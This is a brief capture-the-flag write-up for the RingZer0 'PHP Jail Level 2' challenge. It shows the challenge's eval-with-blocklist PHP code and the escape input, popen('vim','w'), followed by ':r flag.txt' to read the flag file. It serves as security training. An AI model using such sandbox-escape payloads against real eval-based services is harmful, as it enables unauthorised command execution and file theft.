# **PHP Jail 2**

```shell=
ubuntu@ubuntu-virtual-machine:~$ ssh level2@challenges.ringzer0team.com -p 10224 

level2@challenges.ringzer0team.com's password: 

RingZer0 Team Online CTF

PHP Jail Level 2
Current user is uid=1001(level2) gid=1001(level2) groups=1001(level2)

Flag is located at /home/level2/flag.txt

Challenge PHP code:
-----------------------------

<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
        if(preg_match('/(\/|a|c|s|require|include|flag|eval|file)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?>

-----------------------------
Your input:
```

![](https://i.imgur.com/DBMLNYy.png)

Enter `popen('vim','w');`

![](https://i.imgur.com/duulj2n.png)

Enter `:r flag.txt` to read file into buffer.

![](https://i.imgur.com/30AzZ3T.png)

Press any key to continue editing, then you'll see the buffer which load the `flag.txt`.

![](https://i.imgur.com/OBsFbVv.png)

```
FLAG-XXXXXX
```
